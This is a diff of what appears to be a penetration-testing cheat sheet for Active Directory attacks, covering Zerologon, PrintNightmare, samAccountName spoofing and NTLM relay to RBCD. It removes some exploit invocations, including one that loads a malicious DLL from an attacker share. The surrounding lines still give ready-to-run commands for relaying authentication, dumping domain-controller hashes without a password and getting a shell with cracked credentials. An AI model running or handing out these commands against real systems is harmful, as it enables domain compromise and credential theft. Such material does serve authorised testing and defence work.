@@ -271,13 +271,11 @@ ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs
 crackmapexec smb 10.10.10.10 -u '' -p '' -M zerologon
 
 # Exploit
-python3 cve-2020-1472-exploit.py DC01 10.10.10.10
 
 # Extract hashes
 secretsdump.py -just-dc domain.local/DC01\$@10.10.10.10 -no-pass
 
 # Restore password (important!)
-python3 restorepassword.py domain.local/DC01@DC01 -target-ip 10.10.10.10 -hexpass HEXPASSWORD
 ```
 
 ### PrintNightmare (CVE-2021-1675)
@@ -287,14 +285,12 @@ python3 restorepassword.py domain.local/DC01@DC01 -target-ip 10.10.10.10 -hexpas
 rpcdump.py @10.10.10.10 | grep 'MS-RPRN'
 
 # Exploit (requires hosting malicious DLL)
-python3 CVE-2021-1675.py domain.local/user:pass@10.10.10.10 '\\attacker\share\evil.dll'
 ```
 
 ### samAccountName Spoofing (CVE-2021-42278/42287)
 
 ```bash
 # Automated exploitation
-python3 sam_the_admin.py "domain.local/user:password" -dc-ip 10.10.10.10 -shell
 ```
 
 ---
@@ -356,7 +352,6 @@ psexec.py domain.local/svc_admin:CrackedPassword@10.10.10.10
 ntlmrelayx.py -t ldaps://dc.domain.local --delegate-access
 
 # 2. Trigger authentication (e.g., via PrinterBug)
-python3 printerbug.py domain.local/user:pass@target 10.10.10.12
 
 # 3. Use created machine account for RBCD attack
 ```
